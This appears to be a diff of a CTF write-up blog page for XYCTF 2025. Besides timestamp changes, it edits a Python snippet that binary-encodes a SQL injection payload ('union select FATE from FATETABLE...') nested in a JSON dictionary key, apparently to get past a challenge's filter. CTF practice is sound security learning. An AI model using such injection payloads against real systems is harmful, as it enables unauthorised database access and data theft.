@@ -17,7 +17,7 @@
 <meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250728194101623.png">
 <meta property="og:image" content="https://21346asz.github.io/CTFwp/XYCTF-2025/image-20250728200006695.png">
 <meta property="article:published_time" content="2025-07-27T12:30:31.000Z">
-<meta property="article:modified_time" content="2025-07-28T12:10:15.917Z">
+<meta property="article:modified_time" content="2025-07-28T12:11:27.859Z">
 <meta property="article:author" content="wArn">
 <meta property="article:tag" content="CTFwp">
 <meta name="twitter:card" content="summary">
@@ -146,7 +146,7 @@
       
         <time datetime="2025-07-27T12:30:31.000Z" class="dt-published" itemprop="datePublished">2025-07-27</time>
         
-        (Updated: <time datetime="2025-07-28T12:10:15.917Z" class="dt-updated" itemprop="dateModified">2025-07-28</time>)
+        (Updated: <time datetime="2025-07-28T12:11:27.859Z" class="dt-updated" itemprop="dateModified">2025-07-28</time>)
         
       
     </div>
@@ -225,7 +225,7 @@
 <p>那我们使用字典：</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;\&#x27;))))))) union select FATE from FATETABLE where NAME=\&#x27;LAMENTXU\&#x27;--+&quot;</span><span class="punctuation">:</span><span class="number">1</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#123;&quot;name&quot;:&#123;&quot;\&#x27;))))))) union select FATE from FATETABLE where NAME=\&#x27;LAMENTXU\&#x27;--+&quot;:1&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">array = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    a = <span class="built_in">format</span>(<span class="built_in">ord</span>(i),<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) &lt; <span class="number">8</span>:</span><br><span class="line">        a=(<span class="number">8</span>-<span class="built_in">len</span>(a))*<span class="string">&#x27;0&#x27;</span>+a</span><br><span class="line">    array.append(a)</span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;&#x27;</span>.join(array)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&#x27;&#123;&quot;name&quot;:&#123;&quot;\&#x27;))))))) union select FATE from FATETABLE where NAME=\&#x27;LAMENTXU\&#x27;--+&quot;:1&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">array = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> payload:</span><br><span class="line">    a = <span class="built_in">format</span>(<span class="built_in">ord</span>(i),<span class="string">&#x27;b&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(a) &lt; <span class="number">8</span>:</span><br><span class="line">        a=(<span class="number">8</span>-<span class="built_in">len</span>(a))*<span class="string">&#x27;0&#x27;</span>+a</span><br><span class="line">    array.append(a)</span><br><span class="line"></span><br><span class="line">b = <span class="string">&#x27;&#x27;</span>.join(array)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br></pre></td></tr></table></figure>
 
 <img src="/CTFwp/XYCTF-2025/image-20250728200006695.png" class="" title="image-20250728200006695">
 
